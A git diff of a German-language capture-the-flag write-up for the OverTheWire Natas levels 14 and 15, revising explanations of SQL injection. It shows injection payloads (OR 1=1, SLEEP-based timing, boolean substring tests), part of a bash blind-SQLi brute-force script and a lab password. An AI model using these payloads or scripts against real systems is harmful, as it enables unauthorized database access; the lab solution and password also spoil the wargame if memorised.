@@ -1315,7 +1315,12 @@ Im `natas14` Level geht es darum, per **SQL Injection** (**SQLi**) die Authentif
 
 Bei SQL-Injections ist es entscheidend, die verwendete Datenbank-Engine und die genaue **Syntax der Query-Konstruktion** zu kennen. In diesem Fall handelt es sich um eine **MySQL**/**MariaDB-Datenbank** (erkennbar an der `mysqli_connect()`-Funktion).
 
-Außerdem solltest du mit Tests herausfinden, welchen Wert du wie extrahieren kannst. Dies machst du am einfachsten mit verschiedenen SQL-Injections. Die einfachste Methode und die, die am häufigsten genutzt wird, ist: `' OR 1=1 --` (oder mit `#`, statt `--` auskommentiert). Probiere auch Methoden wie `sleep(x)` und lasse die Anwendung eine gewisse Zeit "schlafen". Letzen Endes ist es wichtig zu überprüfen, ob die Datenbank auf SQL-Injections im Allgemeinen anschlägt.
+Außerdem solltest du mit Tests herausfinden, welchen Wert du wie extrahieren kannst. Dies machst du am einfachsten mit verschiedenen SQL-Injections. Die einfachste Methode und die, die am häufigsten genutzt wird, ist: `' OR 1=1 --` (oder mit `#`, statt `--` auskommentiert). Probiere auch Methoden wie `sleep(x)`, wobei `x` die Sekunden darstellt und lasse die Anwendung eine gewisse Zeit "schlafen". Letzen Endes ist es wichtig zu überprüfen, ob die Datenbank auf SQL-Injections im Allgemeinen anschlägt.
+
+```php
+# Beispiel für eine SQL-Injection, die die Ladezeit der Webanwendung um 4 Sekunden verzögert:
+" OR SLEEP(4) #
+```
 
 
 **1. Analyse der Schwachstelle**
@@ -1352,9 +1357,6 @@ Der Ausbruch mit dem doppelten Anführungszeichen (`"`) ist **zwingend notwendig
 
 
 **2. Der Erfolgreiche Bypass: Boolesche Logik**
-
-Um die Story zu vereinfachen:
-Ich habe viele unterschiedliche Befehle probiert. Darunter `' Or 1=1 #`, `' And Length((Select password from users where username='natas15'),1,1) = 'a' #` und weitere magische Variationen, die mich nur auf die **Access Denied** Seite brachten.
 
 **So kommst du an das Passwort:**
 Gib im Eingabefeld für das Username folgenden Befehl ein und bestätige mit Enter:
@@ -1432,17 +1434,16 @@ Burp nutze ich mit der Firefox-Extension `foxyproxy`, was die Übermittlung der 
 
 **1. Vorbereitung auf den Exploit**
 
-Mit der generellen `' Or 1=1 --` (in Beispiel `natas` mit `"`) Befehlskette kann eine SQL-Injection provoziert werden. Außerdem ist der Ausbruch je nach Datenbank unterschiedlich. Der Ausbruch mit `"` gelingt, weil die SQL-Abfrage die Benutzereingabe mit doppelten Anführungszeichen umschließt (`username=\"".$_REQUEST["username"]."\"`). 
+Mit der generellen `' Or 1=1 --` (in Beispiel `natas` mit `"`) Befehlskette kann eine SQL-Injection provoziert werden. Außerdem ist der Ausbruch je nach Datenbank unterschiedlich. Der Ausbruch mit `"` gelingt, weil die SQL-Abfrage die Benutzereingabe mit doppelten Anführungszeichen umschließt (`username=\"".$_REQUEST["username"]."\"`).
 
 **Infos zum Source-Code:**
 
-Die `$query`-Variable, die den Select-Befehl deklariert, wird zusammen mit der Datenbankverbindung in einer neuen Variable `$res` deklariert und anschließend mit der Funktion `mysqli_num_rows()` verglichen, ob der Wert in `$res` größer als `0` ist.
-
-Die Logik tritt ein, sobald ein Wert über die Eingabenübermittlung der Hauptseite von der Datenbank zurückgegeben werden kann, weil er in ihr existiert.
+Die `$query`-Variable, die den Select-Befehl deklariert, wird zusammen mit der Datenbankverbindung in einer neuen Variable `$res` deklariert, die anschließend mit der Funktion `mysqli_num_rows()` vergleicht, ob der Wert in `$res` größer als `0` ist.   
+Die Logik tritt ein, sobald ein Wert als Resulatat über die Eingabenübermittlung der Hauptseite von der Datenbank zurückgegeben werden kann, weil er in ihr existiert.
 
 Die Datenbank von `natas15` hat nur einen Datensatz und der ist: `natas16`.
 
-Dies bestätigt, dass die Anwendung für **Error-Based SQLi** geschützt ist und der Angreifer gezwungen ist, auf die Boolesche Methode auszuweichen..
+Dies bestätigt, dass die Anwendung für **Error-Based SQLi** geschützt ist und der Angreifer gezwungen ist, auf die Boolesche Methode auszuweichen.
 
 
 **2. Passwortlänge herausfinden**
@@ -1468,7 +1469,7 @@ Für echte Penetrationstests wird die Automatisierung von Blind SQL Injection im
 Ich habe mir von der KI ein Programm schreiben lassen, das genau diesen Prozess bewerkstelligt. Das Progamm ist in der Programmiersprache `bash` geschrieben und beinhaltet im Wesentlichen zwei `For-Schleifen`, von der die erste Schleife die Position des Passworts addiert und die zweite Schleife das Alphabet durchläuft.   
 Das Alphabet wird in der Variable `$ALPHABET` deklariert. 
 
-Kopiere das Skript oder schreibe dein eigenes. Du solltest nur kontrollieren, ob die Authentifizierungs-Daten aktuell sind, falls nicht, dann änderst du diese in der `AUTH`-Varible.
+Kopiere das Skript oder schreibe dein eigenes. Du solltest nur kontrollieren, ob die Authentifizierungs-Daten aktuell sind, falls nicht, dann änderst du diese in der `AUTH`-Variable.
 
 <details><summary>Code anzeigen</summary>
 
@@ -1484,7 +1485,7 @@ MAX_LENGTH=33
 URL="http://natas15.natas.labs.overthewire.org/index.php"
 AUTH="natas15:5dQIqbsFcz3YotINYfRZSzWbLKm0lrVx" # Prüfen, ob Zugangsdaten aktuell
 
-# Payload Base und Ende // %27 URL-Encding für das Zeichen ' 
+# Payload Base und Ende // %27 URL-Encoding für das Zeichen ' 
 PAYLOAD_BASE='natas16" AND (SELECT 1 FROM users WHERE username=%27natas16%27 AND binary SUBSTRING(password,'
 PAYLOAD_END=",1)='__CHAR__') #" # CHAR als Platzhalter, wird später ersetzt in $SQL-INJECTION_TEST
 PASSWORD=""
@@ -1496,7 +1497,7 @@ echo -n "Found Password: " # Start der fortlaufenden Ausgabe
 for ((POS=1; POS <= MAX_LENGTH; POS++)); do
     FOUND_CHAR=0
 
-    # Iteriert du die Variable ALPHABET
+    # Iteriert die Variable ALPHABET
     for ((I=0; I < ${#ALPHABET}; I++)); do
         CHAR="${ALPHABET:$I:1}"
 
